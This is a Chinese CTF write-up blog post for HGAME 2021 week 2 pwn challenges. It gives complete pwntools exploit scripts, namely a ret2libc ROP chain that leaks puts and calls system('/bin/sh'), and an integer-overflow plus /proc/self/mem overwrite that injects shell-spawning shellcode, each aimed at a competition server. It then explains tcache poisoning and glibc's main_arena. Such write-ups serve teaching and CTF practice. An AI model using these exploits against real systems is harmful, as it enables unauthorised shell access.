<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>HGAME2021-WEEK2-PWN-WP - blog of chuj</title><link rel=icon type=image/png href=https://chujdk.github.io/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='rop_primary
没什么难度，就是单纯的 ROP
#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
import re

elf = ELF("./rop_primary")
pop_rdi_ret = 0x401613
pop_rsi_r15_ret = 0x401611
pop_r14_r15_ret = 0x401610

def matrixMul(A, B):
    if len(A[0]) == len(B):
        res = [[0] * len(B[0]) for i in range(len(A))]
        for i in range(len(A)):
            for j in range(len(B[0])):
                for k in range(len(B)):
                    res[i][j] += int(A[i][k]) * int(B[k][j])
        return res

sh = remote("159.75.104.107",30372)

sh.recvuntil("A:\n")
matA = []
matB = []
while 1:
    number_string = sh.recvuntil("\n",drop = True)
    if(number_string == &#39;B:&#39;):
        break
    matA.append(re.findall(r"\d+\.?\d*",number_string))

while 1:
    number_string = sh.recvuntil("\n",drop = True)
    if(number_string == &#39;a * b = ?&#39;):
        break
    matB.append(re.findall(r"\d+\.?\d*",number_string))

matAns = matrixMul(matA,matB)
print matAns

for i in matAns:
    for j in i:
        sh.sendline(str(j))

sh.recvuntil("best\n")
payload = &#39;a&#39; * 0x30 + &#39;b&#39; * 8 + p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.symbols["puts"]) + p64(0x40157B)
sh.sendline(payload)
leak_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))
log.success("addr:" + hex(leak_addr))

libc = LibcSearcher(&#39;puts&#39;,leak_addr)
libc_base = leak_addr - libc.dump("puts")
log.success("libc_base:" + hex(libc_base))
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;)

payload = &#39;a&#39; * 0x30 + &#39;b&#39; * 8 + p64(pop_r14_r15_ret) + p64(0) * 2 
payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
sh.sendlineafter(&#39;best\n&#39;,payload)
sh.interactive()
写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒'><meta property="og:image" content><meta property="og:url" content="https://chujdk.github.io/wp/1079.html"><meta property="og:site_name" content="blog of chuj"><meta property="og:title" content="HGAME2021-WEEK2-PWN-WP"><meta property="og:description" content='rop_primary 没什么难度，就是单纯的 ROP
#!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * import re elf = ELF("./rop_primary") pop_rdi_ret = 0x401613 pop_rsi_r15_ret = 0x401611 pop_r14_r15_ret = 0x401610 def matrixMul(A, B): if len(A[0]) == len(B): res = [[0] * len(B[0]) for i in range(len(A))] for i in range(len(A)): for j in range(len(B[0])): for k in range(len(B)): res[i][j] += int(A[i][k]) * int(B[k][j]) return res sh = remote("159.75.104.107",30372) sh.recvuntil("A:\n") matA = [] matB = [] while 1: number_string = sh.recvuntil("\n",drop = True) if(number_string == &#39;B:&#39;): break matA.append(re.findall(r"\d+\.?\d*",number_string)) while 1: number_string = sh.recvuntil("\n",drop = True) if(number_string == &#39;a * b = ?&#39;): break matB.append(re.findall(r"\d+\.?\d*",number_string)) matAns = matrixMul(matA,matB) print matAns for i in matAns: for j in i: sh.sendline(str(j)) sh.recvuntil("best\n") payload = &#39;a&#39; * 0x30 + &#39;b&#39; * 8 + p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.symbols["puts"]) + p64(0x40157B) sh.sendline(payload) leak_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) log.success("addr:" + hex(leak_addr)) libc = LibcSearcher(&#39;puts&#39;,leak_addr) libc_base = leak_addr - libc.dump("puts") log.success("libc_base:" + hex(libc_base)) system_addr = libc_base + libc.dump("system") bin_sh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;) payload = &#39;a&#39; * 0x30 + &#39;b&#39; * 8 + p64(pop_r14_r15_ret) + p64(0) * 2 payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) sh.sendlineafter(&#39;best\n&#39;,payload) sh.interactive() 写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-09T19:00:00+00:00"><meta property="article:modified_time" content="2021-02-09T19:00:00+00:00"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Hctf-Game"><meta name=twitter:card content="summary"><meta name=twitter:title content="HGAME2021-WEEK2-PWN-WP"><meta name=twitter:description content='rop_primary 没什么难度，就是单纯的 ROP
#!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * import re elf = ELF("./rop_primary") pop_rdi_ret = 0x401613 pop_rsi_r15_ret = 0x401611 pop_r14_r15_ret = 0x401610 def matrixMul(A, B): if len(A[0]) == len(B): res = [[0] * len(B[0]) for i in range(len(A))] for i in range(len(A)): for j in range(len(B[0])): for k in range(len(B)): res[i][j] += int(A[i][k]) * int(B[k][j]) return res sh = remote("159.75.104.107",30372) sh.recvuntil("A:\n") matA = [] matB = [] while 1: number_string = sh.recvuntil("\n",drop = True) if(number_string == &#39;B:&#39;): break matA.append(re.findall(r"\d+\.?\d*",number_string)) while 1: number_string = sh.recvuntil("\n",drop = True) if(number_string == &#39;a * b = ?&#39;): break matB.append(re.findall(r"\d+\.?\d*",number_string)) matAns = matrixMul(matA,matB) print matAns for i in matAns: for j in i: sh.sendline(str(j)) sh.recvuntil("best\n") payload = &#39;a&#39; * 0x30 + &#39;b&#39; * 8 + p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.symbols["puts"]) + p64(0x40157B) sh.sendline(payload) leak_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) log.success("addr:" + hex(leak_addr)) libc = LibcSearcher(&#39;puts&#39;,leak_addr) libc_base = leak_addr - libc.dump("puts") log.success("libc_base:" + hex(libc_base)) system_addr = libc_base + libc.dump("system") bin_sh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;) payload = &#39;a&#39; * 0x30 + &#39;b&#39; * 8 + p64(pop_r14_r15_ret) + p64(0) * 2 payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) sh.sendlineafter(&#39;best\n&#39;,payload) sh.interactive() 写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒'><script src=https://chujdk.github.io/js/feather.min.js></script><link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.d24d3471089d3a4f095edc4a6857e25a9f1c6dd3e7d17026141ccad319438873.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts>All posts</a>
<a href=/about.html>About</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>HGAME2021-WEEK2-PWN-WP</h1><div class=meta>Posted on Feb 9, 2021</div></div><section class=body><h3 id=rop_primary>rop_primary</h3><p>没什么难度，就是单纯的 ROP</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>re</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./rop_primary&#34;</span>)
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> <span style=color:#40a070>0x401613</span>
</span></span><span style=display:flex><span>pop_rsi_r15_ret <span style=color:#666>=</span> <span style=color:#40a070>0x401611</span>
</span></span><span style=display:flex><span>pop_r14_r15_ret <span style=color:#666>=</span> <span style=color:#40a070>0x401610</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>matrixMul</span>(A, B):
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> <span style=color:#007020>len</span>(A[<span style=color:#40a070>0</span>]) <span style=color:#666>==</span> <span style=color:#007020>len</span>(B):
</span></span><span style=display:flex><span>        res <span style=color:#666>=</span> [[<span style=color:#40a070>0</span>] <span style=color:#666>*</span> <span style=color:#007020>len</span>(B[<span style=color:#40a070>0</span>]) <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(A))]
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(A)):
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>for</span> j <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(B[<span style=color:#40a070>0</span>])):
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>for</span> k <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(B)):
</span></span><span style=display:flex><span>                    res[i][j] <span style=color:#666>+=</span> <span style=color:#007020>int</span>(A[i][k]) <span style=color:#666>*</span> <span style=color:#007020>int</span>(B[k][j])
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> res
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30372</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;A:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>matA <span style=color:#666>=</span> []
</span></span><span style=display:flex><span>matB <span style=color:#666>=</span> []
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#40a070>1</span>:
</span></span><span style=display:flex><span>    number_string <span style=color:#666>=</span> sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span>(number_string <span style=color:#666>==</span> <span style=color:#4070a0>&#39;B:&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
</span></span><span style=display:flex><span>    matA<span style=color:#666>.</span>append(re<span style=color:#666>.</span>findall(<span style=color:#4070a0>r</span><span style=color:#4070a0>&#34;\d+\.?\d*&#34;</span>,number_string))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#40a070>1</span>:
</span></span><span style=display:flex><span>    number_string <span style=color:#666>=</span> sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span>(number_string <span style=color:#666>==</span> <span style=color:#4070a0>&#39;a * b = ?&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
</span></span><span style=display:flex><span>    matB<span style=color:#666>.</span>append(re<span style=color:#666>.</span>findall(<span style=color:#4070a0>r</span><span style=color:#4070a0>&#34;\d+\.?\d*&#34;</span>,number_string))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>matAns <span style=color:#666>=</span> matrixMul(matA,matB)
</span></span><span style=display:flex><span><span style=color:#007020>print</span> matAns
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> matAns:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> j <span style=color:#007020;font-weight:700>in</span> i:
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(j))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;best</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;puts&#39;</span>]) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;puts&#34;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40157B</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendline(payload)
</span></span><span style=display:flex><span>leak_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;addr:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(leak_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> LibcSearcher(<span style=color:#4070a0>&#39;puts&#39;</span>,leak_addr)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> leak_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;puts&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;system&#34;</span>)
</span></span><span style=display:flex><span>bin_sh_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#39;str_bin_sh&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(pop_r14_r15_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> 
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(bin_sh_addr) <span style=color:#666>+</span> p64(system_addr)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;best</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,payload)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒</p><h3 id=the_shop_of_cosmos>the_shop_of_cosmos</h3><p>这道题是真的开阔视野了，出的是真当炫酷。程序的逻辑很简单，有无限次读文件和无限次写文件的机会。其实看到题目我第一个就想到了对 <code>/proc</code> 目录动手，但是当时觉得不知道服务器跑的进程的 <code>uid</code> 也没有用。虽然终端里面有 <code>$UID</code> 可以代替，但是 <code>open</code> 里没法用，遂放弃，想想真的很遗憾，放出 <code>hint</code>之后我仔细看了一下这个目录的相关知识，了解到有<code>self</code> 这个目录，每个进程访问都可以访问到自己的对应 <code>uid</code> 的目录，同时也避免了 <code>frok</code> 之类操作对 <code>uid</code> 的改变这样的问题。而每个进程对应 <code>uid</code> 目录中都有一些该进程信息的虚拟文件，我们主要关系 <code>maps</code> 和 <code>mem</code>,前者存储了进程的内存映射情况，可以获得各种基地址；后者则是进程占有的整个内存空间的映射，这个文件是可读写的，<code>.text</code> 也同样可写。所以思路就有了，先通过一次读获取进程的基地址，然后通过一次写把一段会执行的 <code>.text</code> 中的代码直接写成 shellcode 就可以 getshell 了。</p><p>利用整型溢出可以获得无限的钱，这个应该不用多说了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>,os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./shop&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./shop&#34;</span>)
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30398</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#34;1&#34;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#34;4294867296&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;/proc/self/maps&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;：&#34;</span>)
</span></span><span style=display:flex><span>prog_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;prog_base:&#34;</span>,prog_base)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;/proc/self/mem&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x17EC</span>))
</span></span><span style=display:flex><span>shellcode <span style=color:#666>=</span> asm(shellcraft<span style=color:#666>.</span>sh())
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#007020>len</span>(shellcode)))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,shellcode)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=patriots-note>patriot’s note</h3><p>这算是一个 <code>Tcache poisoning</code> 的裸题了吧，以前做题的时候一直没去研究 <code>Tcache</code> 相关的机制，这一次看了一下发现确实使利用变的简单了许多。<code>Tcache</code> 的优先级很高，高于 <code>Fastbin</code> 和 <code>top chunk</code> 的前向合并。 <code>Tcache</code> 和 <code>Fastbin</code> 其实挺像的，当然 <code>Tcache</code> 本身是一个单独维护的隔离链表，而 <code>Fastbin</code> 只是一个 LIFO 的单链表（换句话说就是用链表模拟的栈），这里来看的话区别还是很大的，但是在利用上有相似之处。就本题来看，存在 <code>UAF</code> ，可以对 <code>Tcache</code> 结构体的 <code>next</code> 指针任意写，这样就可以实现任意地址分配，从而实现任意地址写。和 <code>Fastbin</code> 的 <code>Arbitrary Alloc</code> 没什么区别，唯一的就是 <code>Tcache</code> 不会对被分配地址 <code>chunk</code> 的 <code>size</code> 标记做检测，所以我们甚至不需要伪造 <code>size</code> 就可以直接 <code>Arbitrary Alloc</code> 了。当然实现利用还需要一个 leak，可以申请并释放一个属于 <code>Unsorted Bin</code> 的 <code>chunk</code>（就本题而言，还需要避免这个 <code>chunk</code> 被 <code>top chunk</code> 合并掉），这样在 <code>bin</code>中的<code>chunk</code>的<code>fd</code>指针就会指向<code>main_arena</code>的一个固定偏移处，然后通过<code>puts</code> 功能就可以 leak 出 libc 的基地址了。</p><h4 id=关于-main_arena>关于 <code>main_arena</code></h4><h5 id=fd-指向-main_arena-的固定偏移处的原因><code>fd</code> 指向 <code>main_arena</code> 的固定偏移处的原因</h5><p>随随便便地说 <code>fd</code> 必定会指向 <code>main_arena</code> 的一个固定偏移显得很苍白，原因还是解释一下，<code>main_arena</code> 是 <code>ptmalloc</code> 管理主分配区的唯一实例，其类型为 <code>struct malloc_state</code>，就 2.27 版本的 libc 来说是这样定义的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_state</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Serialize access.  */</span>
</span></span><span style=display:flex><span>  __libc_lock_define (, mutex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Flags (formerly in max_fast).  */</span>
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> flags;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Note this is a bool but not all targets support atomics on booleans.  */</span>
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> have_fastchunks;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Fastbins */</span>
</span></span><span style=display:flex><span>  mfastbinptr fastbinsY[NFASTBINS];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
</span></span><span style=display:flex><span>  mchunkptr top;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* The remainder from the most recent split of a small request */</span>
</span></span><span style=display:flex><span>  mchunkptr last_remainder;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Normal bins packed as described above */</span>
</span></span><span style=display:flex><span>  mchunkptr bins[NBINS <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#666>-</span> <span style=color:#40a070>2</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Bitmap of bins */</span>
</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> binmap[BINMAPSIZE];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Linked list */</span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_state</span> <span style=color:#666>*</span>next;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Linked list for free arenas.  Access to this field is serialized
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     by free_list_lock in arena.c.  */</span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_state</span> <span style=color:#666>*</span>next_free;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Number of threads attached to this arena.  0 if the arena is on
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     the free list.  Access to this field is serialized by
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     free_list_lock in arena.c.  */</span>
</span></span><span style=display:flex><span>  INTERNAL_SIZE_T attached_threads;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Memory allocated from the system in this arena.  */</span>
</span></span><span style=display:flex><span>  INTERNAL_SIZE_T system_mem;
</span></span><span style=display:flex><span>  INTERNAL_SIZE_T max_system_mem;
</span></span><span style=display:flex><span>};
